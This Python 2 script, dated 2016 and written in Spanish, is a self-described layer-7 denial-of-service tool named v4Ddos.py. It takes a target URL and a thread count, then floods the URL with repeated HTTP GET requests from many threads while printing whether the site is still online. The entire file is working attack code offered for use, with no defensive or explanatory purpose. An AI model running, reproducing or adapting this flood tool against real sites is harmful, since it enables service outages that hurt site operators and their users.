#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Autor: v4char
# Email: v4char@gmail.com
# Date:  11-2-2016

import threading
import sys
import requests
import time

print '       _  _   ____      _           '
print '__   _| || | |  _ \  __| | ___  ___ '
print '\ \ / / || |_| | | |/ _` |/ _ \/ __|'
print ' \ V /|__   _| |_| | (_| | (_) \__ \\'
print '  \_/    |_| |____/ \__,_|\___/|___/'
print '                                    '

print '\nv4Ddos.py Script creado por v4char, ataque a la capa 7 protocolo TCP'

if len(sys.argv) >= 3:

   url = sys.argv[1]
   hilos = int(sys.argv[2])
   activo = 1
   estado = '+'

   def conectar():
      global url
      global activo
      global estado

      while activo:
         if activo == 0:
            raise
            break
         else:
            try:
               requests.get(url,timeout=8)
               estado = '+'
            except KeyboardInterrupt:
               activo = 0
            except:
               estado = '-'

   def principal():
      global hilos

      threads = list()
      for i in range(hilos):
         conexion = threading.Thread(target=conectar)
         threads.append(conexion)
         conexion.start()

      print "Empezando el ataque (+ web online | - web offline):\n"

   print "\nCreando conexiones...\n"
   principal()
   while activo:
      try:
         sys.stdout.write(estado+" ")
         sys.stdout.flush()
         time.sleep(1)
      except KeyboardInterrupt:
         activo = 0
         print '\n\nCerrando conexiones...'
      except:
         1
else:
   print "\nUsa 'python v4Ddos.py http://web/patch número de conexiones simultaneas'"
